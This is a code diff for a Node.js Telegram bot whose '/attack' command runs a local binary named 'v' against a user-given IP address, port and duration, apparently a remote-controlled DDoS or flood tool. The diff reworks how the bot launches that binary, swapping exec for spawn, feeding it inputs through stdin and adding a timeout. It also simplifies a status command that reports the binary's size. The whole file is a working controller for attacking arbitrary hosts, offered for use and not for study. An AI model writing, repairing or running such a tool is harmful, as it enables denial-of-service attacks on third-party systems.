@@ -1,24 +1,16 @@
 const { Telegraf } = require('telegraf');
-const { exec } = require('child_process');
+const { spawn } = require('child_process');
 const fs = require('fs');
 const path = require('path');
 
 const bot = new Telegraf(process.env.BOT_TOKEN);
-const BINARY_PATH = '/app/v';
+const BINARY_PATH = path.join(__dirname, 'v');
 const ALLOWED_USER_ID = '8743980380';
 
-// Check if binary exists on startup
+// Make sure binary is executable
 if (fs.existsSync(BINARY_PATH)) {
-  console.log('✅ Binary found at', BINARY_PATH);
   fs.chmodSync(BINARY_PATH, '755');
-} else {
-  console.log('❌ Binary NOT found at', BINARY_PATH);
-  // Try current directory
-  const localPath = path.join(__dirname, 'v');
-  if (fs.existsSync(localPath)) {
-    console.log('✅ Binary found at', localPath);
-    fs.chmodSync(localPath, '755');
-  }
+  console.log('✅ Binary ready');
 }
 
 bot.command('attack', async (ctx) => {
@@ -33,43 +25,56 @@ bot.command('attack', async (ctx) => {
   const port = args[2];
   const duration = args[3];
   
-  // Try different binary paths
-  let binaryPath = '/app/v';
-  if (!fs.existsSync(binaryPath)) {
-    binaryPath = path.join(__dirname, 'v');
-  }
+  await ctx.reply(`🎯 Attacking ${ip}:${port} for ${duration}s\n⏳ Starting...`);
   
-  const command = `${binaryPath} ${ip} ${port} ${duration}`;
+  // Spawn the process
+  const process = spawn(BINARY_PATH);
   
-  await ctx.reply(`🎯 Attacking ${ip}:${port} for ${duration}s`);
+  let output = '';
+  let step = 0;
   
-  exec(command, { timeout: duration * 1000 + 5000 }, (error, stdout, stderr) => {
-    const output = stdout || stderr || error?.message || 'Completed';
-    ctx.reply(`✅ Result:\n${output.slice(0, 4000)}`);
+  process.stdout.on('data', (data) => {
+    const text = data.toString();
+    output += text;
+    
+    // Send inputs one by one when prompted
+    if (text.includes('Enter target IP address') || text.includes('IP')) {
+      process.stdin.write(ip + '\n');
+      step = 1;
+    } else if (text.includes('port') || text.includes('PORT')) {
+      process.stdin.write(port + '\n');
+      step = 2;
+    } else if (text.includes('duration') || text.includes('time')) {
+      process.stdin.write(duration + '\n');
+      step = 3;
+    }
   });
+  
+  process.stderr.on('data', (data) => {
+    output += data.toString();
+  });
+  
+  process.on('close', (code) => {
+    ctx.reply(`✅ Attack completed\n📤 Output:\n${output.slice(0, 3900) || 'Attack finished'}`);
+  });
+  
+  // Timeout protection
+  setTimeout(() => {
+    if (!process.killed) {
+      process.kill();
+      ctx.reply('⚠️ Attack timed out');
+    }
+  }, duration * 1000 + 10000);
 });
 
 bot.command('status', async (ctx) => {
   if (ctx.from.id.toString() !== ALLOWED_USER_ID) return;
   
-  // Check if binary exists
-  let found = false;
-  let info = '';
-  
-  if (fs.existsSync('/app/v')) {
-    found = true;
-    const stats = fs.statSync('/app/v');
-    info = `Size: ${(stats.size / 1024).toFixed(2)} KB`;
-  } else if (fs.existsSync(path.join(__dirname, 'v'))) {
-    found = true;
-    const stats = fs.statSync(path.join(__dirname, 'v'));
-    info = `Size: ${(stats.size / 1024).toFixed(2)} KB (local)`;
-  }
-  
-  if (found) {
-    ctx.reply(`✅ Binary ready\n${info}`);
+  if (fs.existsSync(BINARY_PATH)) {
+    const stats = fs.statSync(BINARY_PATH);
+    ctx.reply(`✅ Binary ready\n📦 Size: ${(stats.size / 1024).toFixed(2)} KB`);
   } else {
-    ctx.reply('❌ Binary not found. Railway failed to compile v.cpp');
+    ctx.reply('❌ Binary not found');
   }
 });
 
